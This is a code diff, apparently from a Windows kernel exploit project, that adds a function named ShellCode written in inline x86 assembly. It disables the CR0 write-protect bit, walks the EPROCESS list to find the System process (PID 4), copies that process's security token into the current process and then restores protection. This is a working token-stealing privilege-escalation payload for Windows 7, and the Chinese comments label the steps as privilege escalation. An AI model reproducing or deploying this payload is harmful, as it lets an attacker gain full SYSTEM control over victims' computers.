@@ -235,3 +235,67 @@ BOOL CreateClipboard(DWORD dwSize)
 exit:
 	return bRet;
 }
+
+NTSTATUS __declspec(naked) ShellCode(ULONG InformationClass, ULONG BufferSize, PVOID Buffer, PULONG ReturnedLength)
+{
+	__asm
+	{
+		pushfd
+		pushad
+	}
+
+	// 关闭页保护
+	__asm
+	{
+		cli
+		mov eax, cr0
+		and eax, ~0x10000
+		mov cr0, eax
+	}
+
+	// 开始提权
+	__asm
+	{
+		// 取当前线程
+		mov eax, fs:[0x124]
+		// 取线程对应的EPROCESS
+		mov esi, [eax + 0x150]
+		mov eax, esi
+		// 查找PID=4的system进程
+	searchWin7:
+		mov eax, [eax + 0xB8]
+		sub eax, 0xB8
+		mov edx, [eax + 0xB4]
+		cmp edx, 0x4
+		jne searchWin7
+		// 替换Token,并增加引用计数
+		mov eax, [eax + 0xF8]
+		and al, 0xF8
+		mov [esi + 0xF8], eax
+		add [eax - 0x18], 2
+	}
+
+	// 开起页保护
+	__asm
+	{
+		mov eax, cr0
+		or eax, 0x10000
+		mov cr0, eax
+		sti
+	}
+
+	__asm
+	{
+		popad
+		popfd
+	}
+
+	// 设置返回值，退出函数
+	__asm
+	{
+		xor eax, eax
+		ret 0x10
+	}
+}
+
+void ShellCodeEnd(){}
